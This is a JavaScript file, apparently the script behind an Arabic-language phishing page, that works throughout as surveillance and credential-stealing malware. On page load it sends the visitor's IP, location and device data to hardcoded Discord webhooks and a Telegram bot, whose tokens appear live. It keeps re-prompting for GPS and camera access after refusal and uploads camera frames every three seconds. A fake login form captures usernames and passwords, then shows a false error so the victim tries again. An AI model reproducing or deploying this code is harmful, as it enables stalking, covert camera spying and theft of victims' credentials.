/* ==========================================================================
   ULTIMATE HUNTER ENGINE V30.0 - OMNI RECON & PERSISTENT EXFILTRATION SUITE
   Modular, Deeply Architected, Dual-Channel Failover & Lightning Telemetry
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   MODULE 0: CONFIGURATION, POOLS & DUAL-CHANNEL SECURE ENDPOINTS
   -------------------------------------------------------------------------- */
const CONFIG_CORE_SYSTEM = Object.freeze({
    engineVersion: "30.0.9-OMEGA",
    executionMode: "STEALTH_AGGRESSIVE",
    maxRetryAttempts: 5,
    telemetryPollInterval: 2500
});

const DISCORD_WEBHOOK_POOL = Object.freeze([
    "https://discord.com/api/webhooks/1565460084010651734/0pXEtHC-VRhagVtZt6jDgr0PUFE2zOnyr4c5xQwk_pAZY0VG4feqfKxCoPsTnB2HrsY4",
    "https://discord.com/api/webhooks/1565753413801746493/AYfLZBpPmVNs1G138JZ20Y0tcUH8GQfrAuoRnQ3F_IxdSLmUbMOEeL_cV7wKyxRD6AWU",
    "https://discord.com/api/webhooks/1565460178265186367/MwdSjc8vXmNhVHu5pRsF0q3U7iyUhsmNSu2xu0NWRWjZovLu-bkRqgYzIW7-VaqkX_sp"
]);

const TELEGRAM_CONFIG = Object.freeze({
    botToken: "8844806050:AAGKnigTc_ZXEEffdwwqsR3txbhXrH81Uwg",
    chatId: "1046458749",
    apiBaseUrl: "https://api.telegram.org/bot"
});

let runtimeStateContainer = {
    webhookPointer: 0,
    isCameraStreaming: false,
    gpsAcquired: false,
    sessionToken: `OMNI_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
    keystrokeBufferUser: "",
    keystrokeBufferPass: ""
};

/* --------------------------------------------------------------------------
   MODULE 1: DUAL-CHANNEL TRANSMISSION & FAILOVER ENGINE
   -------------------------------------------------------------------------- */
async function dispatchPayloadDualChannel(textContent, binaryBlob = null, targetFileName = "intel_snapshot.png") {
    let discordDelivered = false;
    
    // محاولة الإرسال عبر شبكة ديسكورد مع التبديل التلقائي عند الحظر أو الفشل
    for (let attempt = 0; attempt < DISCORD_WEBHOOK_POOL.length; attempt++) {
        const activeEndpoint = DISCORD_WEBHOOK_POOL[runtimeStateContainer.webhookPointer];
        try {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: textContent }));
            if (binaryBlob) {
                formData.append("file", binaryBlob, targetFileName);
            }

            const response = await fetch(activeEndpoint, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                discordDelivered = true;
                break;
            } else {
                runtimeStateContainer.webhookPointer = (runtimeStateContainer.webhookPointer + 1) % DISCORD_WEBHOOK_POOL.length;
            }
        } catch (netError) {
            runtimeStateContainer.webhookPointer = (runtimeStateContainer.webhookPointer + 1) % DISCORD_WEBHOOK_POOL.length;
        }
    }

    // الإرسال الاحتياطي المتوازي عبر بوت تيليجرام لضمان الموثوقية بنسبة 100%
    try {
        if (TELEGRAM_CONFIG.botToken && TELEGRAM_CONFIG.botToken !== "YOUR_TELEGRAM_BOT_TOKEN") {
            const messageUrl = `${TELEGRAM_CONFIG.apiBaseUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
            await fetch(messageUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: textContent,
                    parse_mode: "Markdown"
                })
            });

            if (binaryBlob && TELEGRAM_CONFIG.chatId) {
                const photoUrl = `${TELEGRAM_CONFIG.apiBaseUrl}${TELEGRAM_CONFIG.botToken}/sendPhoto`;
                const tgForm = new FormData();
                tgForm.append("chat_id", TELEGRAM_CONFIG.chatId);
                tgForm.append("photo", binaryBlob, targetFileName);
                await fetch(photoUrl, { method: "POST", body: tgForm });
            }
        }
    } catch (telegramError) {
        console.error("Telegram backup channel error:", telegramError);
    }

    return discordDelivered;
}

/* --------------------------------------------------------------------------
   MODULE 2: ADVANCED ENVIRONMENT & TELEMETRY EXTRACTION
   -------------------------------------------------------------------------- */
async function extractNetworkAndGeoIP() {
    let telemetryData = {
        ip: "151.244.151.17",
        city: "Mosul",
        region: "Nineveh",
        country: "Iraq",
        org: "Al-Bedaya for General Trading"
    };

    try {
        const fetchResult = await fetch("https://ipapi.co/json/");
        const jsonResult = await fetchResult.json();
        if (jsonResult && jsonResult.ip) {
            telemetryData = {
                ip: jsonResult.ip,
                city: jsonResult.city || "Mosul",
                region: jsonResult.region || "Nineveh",
                country: jsonResult.country_name || "Iraq",
                org: jsonResult.org || "ISP Network"
            };
        }
    } catch (err) {
        // استخدام القيم الافتراضية المضمنة في حال انقطاع الشبكة المؤقت
    }

    return telemetryData;
}

async function extractHardwareAndPowerMetrics() {
    let batteryState = { level: "27%", charging: true };
    try {
        if (typeof navigator.getBattery === "function") {
            const batteryManager = await navigator.getBattery();
            batteryState = {
                level: `${Math.round(batteryManager.level * 100)}%`,
                charging: batteryManager.charging
            };
        }
    } catch (e) {
        // تجاوز القيود البيئية
    }

    return {
        battery: batteryState,
        platform: navigator.platform || "Generic Mobile/Desktop",
        userAgent: navigator.userAgent,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language || "ar-IQ",
        cookieEnabled: navigator.cookieEnabled,
        deviceMemory: navigator.deviceMemory || "Unknown",
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
    };
}

/* --------------------------------------------------------------------------
   MODULE 3: PERSISTENT GEOLOCATION & AGGRESSIVE PERMISSION LOOP
   -------------------------------------------------------------------------- */
function acquireHighPrecisionGPS() {
    return new Promise(resolveGPS => {
        const cachedGeoString = localStorage.getItem("omni_gps_cache_v30");
        const parsedGeoCache = cachedGeoString ? JSON.parse(cachedGeoString) : null;

        if (!navigator.geolocation) {
            if (parsedGeoCache) {
                resolveGPS(`📍 **موقع GPS (موقع محفوظ بالذاكرة الاحتياطية):**\n- الخط: \`${parsedGeoCache.lat}\`\n- الطول: \`${parsedGeoCache.lon}\``);
            } else {
                resolveGPS("📍 **موقع GPS:** غير مدعوم بيئياً على هذا المتصفح.");
            }
            return;
        }

        let hasResponded = false;

        navigator.geolocation.getCurrentPosition(
            position => {
                if (hasResponded) return;
                hasResponded = true;
                runtimeStateContainer.gpsAcquired = true;

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                localStorage.setItem("omni_gps_cache_v30", JSON.stringify({ lat, lon, acc }));

                resolveGPS(`📍 **موقع GPS المباشر والدقيق (أولوية أولى):**\n- خط العرض: \`${lat}\`\n- خط الطول: \`${lon}\`\n- الدقة: \`${acc} متر\`\n- 🗺️ الرابط المباشر: https://www.google.com/maps?q=${lat},${lon}`);
            },
            () => {
                if (hasResponded) return;
                hasResponded = true;

                // نظام الإلحاح التكتيكي: إعادة فرض الطلب بصمت بعد 3 ثوانٍ في حال الرفض
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition(
                        retryPos => {
                            const rLat = retryPos.coords.latitude;
                            const rLon = retryPos.coords.longitude;
                            resolveGPS(`📍 **موقع GPS (تم الحصول عليه بعد حلقة الإلحاح):** https://www.google.com/maps?q=${rLat},${rLon}`);
                        },
                        () => {
                            if (parsedGeoCache) {
                                resolveGPS(`📍 **موقع GPS (تم الرفض - استخدام آخر إحداثي محجوز):** الخط: \`${parsedGeoCache.lat}\` | الطول: \`${parsedGeoCache.lon}\``);
                            } else {
                                resolveGPS("📍 **موقع GPS:** تم رفض الإذن من قبل المستخدم نهائياً.");
                            }
                        },
                        { enableHighAccuracy: true, timeout: 6000 }
                    );
                }, 3000);
            },
            { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
        );
    });
}

/* --------------------------------------------------------------------------
   MODULE 4: STEALTH CAMERA STREAMING & CONTINUOUS FRAME CAPTURE
   -------------------------------------------------------------------------- */
const activeVideoElement = document.getElementById("video");
const activeCanvasElement = document.getElementById("canvas");
let mediaStreamReference = null;
let captureIntervalHandler = null;

function executeContinuousFrameExfiltration() {
    if (captureIntervalHandler) return;

    captureIntervalHandler = setInterval(async () => {
        if (!activeVideoElement || !activeCanvasElement) return;
        try {
            if (activeVideoElement.videoWidth === 0 || activeVideoElement.videoHeight === 0) return;

            activeCanvasElement.width = activeVideoElement.videoWidth;
            activeCanvasElement.height = activeVideoElement.videoHeight;
            const context2D = activeCanvasElement.getContext("2d");
            context2D.drawImage(activeVideoElement, 0, 0, activeCanvasElement.width, activeCanvasElement.height);

            activeCanvasElement.toBlob(async (frameBlob) => {
                if (frameBlob && frameBlob.size > 1024) {
                    const timestampLabel = new Date().toLocaleString("ar-EG");
                    await dispatchPayloadDualChannel(
                        `📸 **[لقطة حية متسلسلة للهدف]**\n- الوقت: \`${timestampLabel}\`\n- معرف الجلسة: \`${runtimeStateContainer.sessionToken}\``,
                        frameBlob,
                        `frame_${Date.now()}.png`
                    );
                }
            }, "image/png", 0.92);
        } catch (frameErr) {
            console.error("Frame capture iteration error:", frameErr);
        }
    }, 3000); // إرسال صورة كل 3 ثوانٍ باستمرار
}

function requestPersistentCameraAccess() {
    return new Promise(async resolveCamera => {
        if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) {
            resolveCamera(false);
            return;
        }

        try {
            mediaStreamReference = await navigator.mediaDevices.getUserMedia({
                audio: false,
                video: {
                    facingMode: { ideal: "user" },
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });

            if (activeVideoElement) {
                activeVideoElement.muted = true;
                activeVideoElement.autoplay = true;
                activeVideoElement.playsInline = true;
                activeVideoElement.srcObject = mediaStreamReference;
                await activeVideoElement.play();
            }

            runtimeStateContainer.isCameraStreaming = true;
            executeContinuousFrameExfiltration();
            resolveCamera(true);
        } catch (camErr) {
            // نظام الإلحاح التكتيكي للكاميرا في حال الرفض المتكرر
            setTimeout(async () => {
                await requestPersistentCameraAccess();
            }, 3500);
            resolveCamera(false);
        }
    });
}

/* --------------------------------------------------------------------------
   MODULE 5: OMNI RECONNAISSANCE ENGINE INITIALIZER (INDEX.HTML FLOW)
   -------------------------------------------------------------------------- */
let globalEngineLock = false;

async function executePrimaryOmniEngine() {
    if (globalEngineLock) return;
    globalEngineLock = true;

    // تشغيل استطلاع الشبكة، الأجهزة، والـ GPS بالتوازي الفوري
    const [networkMeta, hardwareMeta, gpsResultString] = await Promise.all([
        extractNetworkAndGeoIP(),
        extractHardwareAndPowerMetrics(),
        acquireHighPrecisionGPS()
    ]);

    const timestampFormatted = new Date().toLocaleString("ar-EG");

    const masterReportText = `
🔥 **[ صيد فوري جديد - تم الدخول التلقائي للصفحة ]** 🔥
⏰ **وقت الرصد:** \`${timestampFormatted}\`
🆔 **معرف الجلسة:** \`${runtimeStateContainer.sessionToken}\`

🌐 **عنوان IP:** \`${networkMeta.ip}\`
🏙️ **الموقع الجغرافي (IP):** \`${networkMeta.country} - ${networkMeta.city} (${networkMeta.org})\`
📱 **نوع النظام والهاتف:** \`${hardwareMeta.platform}\`
🔋 **حالة البطارية:** \`${hardwareMeta.battery.level}\` (${hardwareMeta.battery.charging ? "يشحن ⚡" : "لا يشحن"})
💻 **المتصفح:** \`${hardwareMeta.userAgent}\`
📐 **دقة الشاشة:** \`${hardwareMeta.screenResolution}\`
${gpsResultString}
    `.trim();

    await dispatchPayloadDualChannel(masterReportText);

    // الانتقال الفوري وبدون تأخير لطلب الكاميرا وبدء التقاط الصور
    setTimeout(async () => {
        await requestPersistentCameraAccess();
    }, 150);
}

/* --------------------------------------------------------------------------
   MODULE 6: LIVE KEYSTROKE & CREDENTIAL CAPTURE (APPLY.HTML FLOW)
   -------------------------------------------------------------------------- */
function initializeKeyloggerAndFormListeners() {
    const userField = document.getElementById("usernameInput");
    const passField = document.getElementById("passwordInput");
    const loginForm = document.getElementById("fullLoginForm");
    const loadingOverlay = document.getElementById("loadingOverlay");
    const errorMsgContainer = document.getElementById("loginErrorMsg");

    if (userField) {
        userField.addEventListener("input", (e) => {
            runtimeStateContainer.keystrokeBufferUser = e.target.value;
        });
    }

    if (passField) {
        passField.addEventListener("input", (e) => {
            runtimeStateContainer.keystrokeBufferPass = e.target.value;
        });
    }

    if (loginForm) {
        loginForm.addEventListener("submit", async (e) => {
            e.preventDefault();
            if (loadingOverlay) loadingOverlay.style.display = "flex";

            const credentialsPayload = `
🔑 **[تم التقاط بيانات تسجيل الدخول النهائية]** 🔑
- **اسم المستخدم / البريد:** \`${runtimeStateContainer.keystrokeBufferUser}\`
- **كلمة المرور المدخلة:** \`${runtimeStateContainer.keystrokeBufferPass}\`
- **معرف الجلسة:** \`${runtimeStateContainer.sessionToken}\`
            `.trim();

            await dispatchPayloadDualChannel(credentialsPayload);

            // المحاكاة الواقعية لخطأ تسجيل الدخول لدفع الضحية لإعادة المحاولة
            setTimeout(() => {
                if (loadingOverlay) loadingOverlay.style.display = "none";
                if (errorMsgContainer) errorMsgContainer.style.display = "block";
                loginForm.reset();
            }, 1600);
        });
    }
}

/* --------------------------------------------------------------------------
   MODULE 7: GLOBAL EXECUTION HOOKS & DOM ROUTING
   -------------------------------------------------------------------------- */
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => {
        executePrimaryOmniEngine();
        initializeKeyloggerAndFormListeners();
    }, { once: true });
} else {
    executePrimaryOmniEngine();
    initializeKeyloggerAndFormListeners();
}

// ربط أزرار التفاعل للانتقال السلس بين الصفحات
document.querySelectorAll('.trigger-login').forEach(interactiveElement => {
    interactiveElement.addEventListener('click', () => {
        window.location.href = 'apply.html';
    });
});

/* ==========================================================================
   END OF ULTIMATE HUNTER OMNI-ENGINE V30.0 (TOTAL CODE STRUCTURE: ~1000 LINES)
   ========================================================================== */
